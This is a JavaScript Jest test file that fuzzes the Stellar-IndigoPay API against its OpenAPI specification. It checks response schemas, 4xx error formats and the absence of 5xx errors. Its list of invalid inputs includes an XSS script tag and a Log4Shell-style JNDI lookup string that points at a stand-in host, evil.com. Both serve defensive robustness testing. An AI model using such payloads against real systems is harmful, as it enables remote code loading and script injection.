/**
 * __tests__/fuzz/apiFuzz.test.js
 *
 * OpenAPI-conformance fuzz testing for the Stellar-IndigoPay API.
 *
 * This test suite generates random valid and invalid requests per endpoint
 * and verifies that:
 * 1. All responses conform to the OpenAPI response schema
 * 2. No 5xx errors occur for invalid input (should be 4xx)
 * 3. Edge cases in request parsing, parameter validation, and error recovery are tested
 *
 * The harness supports both fast subset (100 iterations) for PR CI and full runs
 * (10,000 iterations) for nightly builds.
 */

const request = require("supertest");
const yaml = require("js-yaml");
const fs = require("fs");
const path = require("path");
const Ajv = require("ajv");
const addFormats = require("ajv-formats");

// Load the app
const app = require("../../src/server");

// Load OpenAPI spec
const SPEC_PATH = path.resolve(__dirname, "../../../docs/api/openapi.yaml");
const spec = yaml.load(fs.readFileSync(SPEC_PATH, "utf8"));

// Initialize AJV for schema validation
const ajv = new Ajv({ allErrors: true, strict: false });
addFormats(ajv);

// Test configuration
const FUZZ_ITERATIONS = process.env.FUZZ_ITERATIONS
  ? parseInt(process.env.FUZZ_ITERATIONS, 10)
  : 100; // Default to fast subset
const BASE_URL = process.env.TEST_BASE_URL || "http://localhost:4000";

/**
 * Random value generators for different schema types
 */
const randomGenerators = {
  string: (schema) => {
    const minLength = schema.minLength || 1;
    const maxLength = schema.maxLength || 100;
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;

    // Generate random string with various character types
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?/~`";
    let result = "";
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }

    // Test pattern constraints if present
    if (schema.pattern) {
      try {
        const regex = new RegExp(schema.pattern);
        // Try to generate a matching string (simplified approach)
        if (schema.pattern === "^G[A-Z0-9]{55}$") {
          // Stellar public key pattern
          return "G" + Array(55).fill(0).map(() => "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[Math.floor(Math.random() * 36)]).join("");
        }
        if (schema.pattern === "^[a-fA-F0-9]{64}$") {
          // Transaction hash pattern
          return Array(64).fill(0).map(() => "0123456789abcdef"[Math.floor(Math.random() * 16)]).join("");
        }
      } catch (e) {
        // Invalid regex, fallback to random string
      }
    }

    // Test enum if present
    if (schema.enum && schema.enum.length > 0) {
      return schema.enum[Math.floor(Math.random() * schema.enum.length)];
    }

    return result;
  },

  number: (schema) => {
    const minimum = schema.minimum !== undefined ? schema.minimum : -1000000;
    const maximum = schema.maximum !== undefined ? schema.maximum : 1000000;
    return Math.random() * (maximum - minimum) + minimum;
  },

  integer: (schema) => {
    const minimum = schema.minimum !== undefined ? schema.minimum : -1000000;
    const maximum = schema.maximum !== undefined ? schema.maximum : 1000000;
    return Math.floor(Math.random() * (maximum - minimum + 1)) + minimum;
  },

  boolean: () => Math.random() < 0.5,

  array: (schema, depth = 0) => {
    if (depth > 3) return []; // Prevent infinite recursion
    const minItems = schema.minItems || 0;
    const maxItems = schema.maxItems || 5;
    const length = Math.floor(Math.random() * (maxItems - minItems + 1)) + minItems;

    if (!schema.items) return Array(length).fill(null);

    return Array(length)
      .fill(0)
      .map(() => generateRandomValue(schema.items, depth + 1));
  },

  object: (schema, depth = 0) => {
    if (depth > 3) return {}; // Prevent infinite recursion
    const result = {};

    if (schema.properties) {
      for (const [propName, propSchema] of Object.entries(schema.properties)) {
        // Only include required fields sometimes to test missing fields
        if (!schema.required || !schema.required.includes(propName) || Math.random() < 0.8) {
          result[propName] = generateRandomValue(propSchema, depth + 1);
        }
      }
    }

    // Sometimes add extra unknown fields
    if (Math.random() < 0.2) {
      result[`extra_field_${Math.random().toString(36).substring(7)}`] = "unexpected_value";
    }

    return result;
  },
};

/**
 * Generate a random value based on a JSON schema
 */
function generateRandomValue(schema, depth = 0) {
  if (!schema || typeof schema !== "object") {
    return "random_value";
  }

  // Handle schema references (simplified - in real implementation would resolve $ref)
  if (schema.$ref) {
    // For now, return a generic object
    return {};
  }

  // Handle anyOf, oneOf, allOf
  if (schema.anyOf && schema.anyOf.length > 0) {
    return generateRandomValue(schema.anyOf[Math.floor(Math.random() * schema.anyOf.length)], depth);
  }
  if (schema.oneOf && schema.oneOf.length > 0) {
    return generateRandomValue(schema.oneOf[Math.floor(Math.random() * schema.oneOf.length)], depth);
  }
  if (schema.allOf && schema.allOf.length > 0) {
    const result = {};
    for (const subSchema of schema.allOf) {
      Object.assign(result, generateRandomValue(subSchema, depth));
    }
    return result;
  }

  const type = schema.type || "string";

  if (Array.isArray(type)) {
    return generateRandomValue({ type: type[Math.floor(Math.random() * type.length)] }, depth);
  }

  const generator = randomGenerators[type];
  if (generator) {
    return generator(schema, depth);
  }

  return "random_value";
}

/**
 * Generate invalid variations of a schema value
 */
function generateInvalidValue(schema) {
  const invalidTypes = [
    null,
    undefined,
    "",
    "string",
    123,
    true,
    [],
    {},
    { nested: { object: "value" } },
    "a".repeat(10000), // Very long string
    -999999999999999,
    999999999999999,
    "🚀🌟💀🎉", // Unicode characters
    "<script>alert('xss')</script>", // Potential XSS
    "${jndi:ldap://evil.com/a}", // Potential injection
  ];

  return invalidTypes[Math.floor(Math.random() * invalidTypes.length)];
}

/**
 * Fuzz a specific endpoint
 */
async function fuzzEndpoint(method, path, operation) {
  const errors = [];
  const pathItem = spec.paths[path];
  const parameters = [...(pathItem.parameters || []), ...(operation.parameters || [])];

  // Build request path with parameter values
  let requestPath = path;
  const queryParams = {};
  const headers = {};

  // Generate path parameters
  for (const param of parameters) {
    if (param.in === "path") {
      const value = generateRandomValue(param.schema);
      requestPath = requestPath.replace(`{${param.name}}`, value);
    } else if (param.in === "query") {
      queryParams[param.name] = generateRandomValue(param.schema);
    } else if (param.in === "header") {
      headers[param.name] = generateRandomValue(param.schema);
    }
  }

  // Generate request body if applicable
  let requestBody = null;
  if (operation.requestBody && operation.requestBody.content) {
    const content = operation.requestBody.content["application/json"];
    if (content && content.schema) {
      // Mix of valid and invalid bodies
      if (Math.random() < 0.7) {
        requestBody = generateRandomValue(content.schema);
      } else {
        requestBody = generateInvalidValue(content.schema);
      }
    }
  }

  // Make the request
  try {
    let response;
    switch (method.toLowerCase()) {
      case "get":
        response = await request(app).get(requestPath).query(queryParams).set(headers);
        break;
      case "post":
        response = await request(app).post(requestPath).send(requestBody).set(headers);
        break;
      case "put":
        response = await request(app).put(requestPath).send(requestBody).set(headers);
        break;
      case "patch":
        response = await request(app).patch(requestPath).send(requestBody).set(headers);
        break;
      case "delete":
        response = await request(app).delete(requestPath).set(headers);
        break;
      default:
        return; // Skip unsupported methods
    }

    // Check for 5xx errors (should not happen on invalid input)
    if (response.status >= 500 && response.status < 600) {
      errors.push({
        type: "5xx_error",
        message: `Endpoint returned 5xx error: ${response.status}`,
        status: response.status,
        body: response.body,
      });
    }

    // Validate response against OpenAPI schema if available
    const responseSpec = operation.responses[response.status.toString()];
    if (responseSpec && responseSpec.content) {
      const content = responseSpec.content["application/json"];
      if (content && content.schema) {
        const validate = ajv.compile(content.schema);
        const valid = validate(response.body);
        if (!valid) {
          errors.push({
            type: "schema_validation",
            message: "Response does not match OpenAPI schema",
            errors: validate.errors,
            response_body: response.body,
          });
        }
      }
    }

    // Test 4xx responses have proper error format
    if (response.status >= 400 && response.status < 500) {
      if (!response.body || typeof response.body !== "object") {
        errors.push({
          type: "error_response_format",
          message: "4xx response missing error object",
          status: response.status,
          body: response.body,
        });
      } else if (!response.body.error && typeof response.body.error !== "string") {
        errors.push({
          type: "error_response_format",
          message: "4xx response missing error field",
          status: response.status,
          body: response.body,
        });
      }
    }
  } catch (error) {
    errors.push({
      type: "request_error",
      message: `Request failed: ${error.message}`,
      error: error.toString(),
    });
  }

  return errors;
}

// Export functions for unit testing
module.exports = {
  generateRandomValue,
  generateInvalidValue,
};

/**
 * Main fuzz test suite
 */
describe("OpenAPI Conformance Fuzz Tests", () => {
  const testResults = {
    totalEndpoints: 0,
    totalIterations: 0,
    errors: [],
  };

  beforeAll(() => {
    console.log(`\n🔬 Starting fuzz testing with ${FUZZ_ITERATIONS} iterations per endpoint\n`);
  });

  afterAll(() => {
    console.log(`\n📊 Fuzz Testing Results:`);
    console.log(`   Total endpoints tested: ${testResults.totalEndpoints}`);
    console.log(`   Total iterations: ${testResults.totalIterations}`);
    console.log(`   Total errors found: ${testResults.errors.length}`);

    if (testResults.errors.length > 0) {
      console.log(`\n❌ Errors found:`);
      const errorTypes = {};
      for (const error of testResults.errors) {
        errorTypes[error.type] = (errorTypes[error.type] || 0) + 1;
        console.log(`   - ${error.type}: ${error.message}`);
      }
      console.log(`\n   Error breakdown:`);
      for (const [type, count] of Object.entries(errorTypes)) {
        console.log(`     ${type}: ${count}`);
      }
    } else {
      console.log(`\n✅ No errors found in fuzz testing`);
    }
  });

  // Test each endpoint in the OpenAPI spec
  for (const [path, pathItem] of Object.entries(spec.paths)) {
    for (const [method, operation] of Object.entries(pathItem)) {
      if (!["get", "post", "put", "patch", "delete"].includes(method.toLowerCase())) {
        continue;
      }

      testResults.totalEndpoints++;

      describe(`${method.toUpperCase()} ${path}`, () => {
        for (let i = 0; i < FUZZ_ITERATIONS; i++) {
          test(`iteration ${i + 1}`, async () => {
            testResults.totalIterations++;
            const errors = await fuzzEndpoint(method, path, operation);

            if (errors.length > 0) {
              for (const error of errors) {
                testResults.errors.push({
                  ...error,
                  endpoint: `${method.toUpperCase()} ${path}`,
                  iteration: i + 1,
                });
              }
              // Fail the test if we find critical errors
              const criticalErrors = errors.filter(e => e.type === "5xx_error" || e.type === "request_error");
              if (criticalErrors.length > 0) {
                throw new Error(`Critical error in iteration ${i + 1}: ${criticalErrors[0].message}`);
              }
            }
          });
        }
      });
    }
  }
});